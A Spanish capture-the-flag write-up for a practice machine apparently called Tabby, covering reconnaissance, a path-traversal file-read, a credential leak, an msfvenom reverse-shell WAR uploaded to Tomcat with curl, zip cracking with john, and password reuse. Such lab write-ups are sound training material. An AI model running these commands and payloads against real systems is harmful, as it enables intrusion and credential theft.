-----
- Tags: #lfi #fileupload #zip2john #john #lxd
---
# Resolución

## Reconocimiento

**OS**: *Linux* 

- ``ping -c 1 10.10.10.194``

```
64 bytes from 10.10.10.194: icmp_seq=1 ttl=63 time=258 ms
```

**TTL** <= "64" = **Linux**

------

**Virtual Hosting**: *``10.10.10.194``* --> http://megahosting.htb/
### NMAP

**Puertos**
```js
# Nmap 7.94SVN scan initiated Mon Nov 25 18:08:02 2024 as: nmap -p- --open --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.10.194
Nmap scan report for 10.10.10.194
Host is up, received user-set (0.25s latency).
Scanned at 2024-11-25 18:08:02 -03 for 14s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Nov 25 18:08:16 2024 -- 1 IP address (1 host up) scanned in 14.84 seconds
```

-----

**Servicios**
```js
# Nmap 7.94SVN scan initiated Mon Nov 25 18:13:16 2024 as: nmap -sCV -p22,80,8080 -oN services 10.10.10.194
Nmap scan report for 10.10.10.194
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 25 18:13:33 2024 -- 1 IP address (1 host up) scanned in 16.61 seconds
```

## Explotación

### LFI 

Detectamos el parámetro vulnerable http://megahosting.htb/news.php?file= en donde al realizar un **Path Traversal** podemos conseguir un **LFI**.

- view-source:http://megahosting.htb/news.php?file=//..//..//..//..//etc/passwd

----

Detectamos que en el servicio web que corre por el *puerto 8080* se necesitan credenciales válidas para ingresar a un panel de administración de **Tomcat**. La misma web nos indica que el archivo de configuración donde se encuentran las credenciales por defecto está en la ruta ``conf/tomcat-users.xml`` pero con nuestro LFI **no podemos apuntar a dicho archivo**, por lo tanto buscamos por internet el directorio por defecto donde se almacenan las credenciales de Tomcat.

![[Tabby 2.png]]

![[Tabby 4.png]]

![[Tabby 4.png]]

Encontramos investigando que la ruta por defecto donde se almacenan las credenciales es ``/usr/share/tomcat9/etc/tomcat-users.xml`` por lo tanto usamos nuestro LFI para ver el contenido de ese archivo.

![[Tabby 5.png]]

Intentamos ingresar nuevamente al panel de autenticación previo con las **credenciales** que obtuvimos.

![[Tabby 6.png]]

Una vez dentro buscamos por internet "*Formas de subir un archivo a Tomcat*", ya que normalmente en este panel se puede realizar dicha acción de forma sencilla, en este caso **no**.

----

Descubrimos que si envíamos una petición con **``curl``** a una ruta especifica proporcionando las credenciales que obtuvimos previamente podremos lograr subir un archivo.

![[Tabby 7.png]]

Por lo tanto lo primero que realizamos es crear un binario con extensión ``.war`` que nos entable una **Reverse Shell** al ser ejecutado, por lo tanto es necesario que sea con *Java*. ``msfvenom -l payloads | grep java  ``

- **``msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.25 LPORT=443 -f war -o reverse.war``**

Luego realizamos el ``curl`` que suba el archivo malicioso a la web en la ruta que vimos en el foro.

- **``curl -s -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/reverse" --upload-file reverse.war``**

Ahora si quisieramos revisar si el archivo se subió correctamente podríamos realizar un ``curl`` a la siguiente ruta ``/manager/text/list``

- **``curl -s -u 'tomcat:$3cureP4s5w0rd123!' -X GET "http://10.10.10.194:8080/manager/text/list"``**. De esta forma listamos los archivos que **están subidos en la web actualmente** y veríamos nuestro "*reverse*".

------

Una vez subido el archivo a la web simplemente nos ponemos en escucha con **``nc -nlvp 443``** y ingresamos a la URL http://megahosting.htb:8080 pero **añadiéndole el nombre de nuestro binario malicioso** que ya está subido, quedando tal que así.

- http://megahosting.htb:8080/reverse

De esta forma el archivo malicioso será interpretado y entablaremos la **Reverse Shell** ganando así el acceso a la máquina.

![[Tabby 8.png]]

## Escalada de Privilegios

Una vez dentro de la máquina víctima veremos que no tenemos acceso al directorio ``/home`` del usuario **``ash``**, por lo tanto tendremos que conseguir acceso a el y luego procedemos con la **escalada de privilegios** al usuario **root**.

-----
### User Pivoting usuario ASH

Encontramos en el directorio ``/var/www/html/files`` un archivo **``backup.zip``** que no podemos descomprimir ya que **nos pide contraseña**. Algo que podemos hacer en estos casos es convertir todo el contenido del archivo a base64 y meter dicho contenido en un archivo en nuestra máquina de atacante.

- ``base64 -w 0 16162020_backup.zip ; echo``

De esta forma tendremos un archivo llamado ``backup.zip`` en nuestra máquina de atacante con el contenido decodificado dentro, por lo tanto si realizamos un ``unzip backup.zip`` nos volverá a pedir contraseña pero como el archivo lo tenemos en nuestro control podremos realizar un ataque de fuerza bruta.

A la herramienta **``zip2john``** le pasaremos el archivo ``backup.zip`` este nos devolverá un HASH, dicho HASH, es decir la respuesta, la meteremos en un archivo llamado **``hash``**.

- **``zip2john backup.zip > hash``**

Ese hash que nos devuelve la herramienta lo pasaremos a la herramienta **``john``**.

- **``john -w:/usr/share/wordlists/rockyou.txt hash``**

Gracias a esto descubrimos que la contraseña del archivo ``.zip`` es **``admin@it``**, por lo tanto lo descomprimimos y dentro no encontramos nada de valor pero descubrimos que esta misma credencial se reutiliza en el usuario **``ash``**, por lo tanto con **``su ash``** accedemos.

### Escalada ROOT

No funcionó pero deberíamos **abusar** del grupo ``lxd``.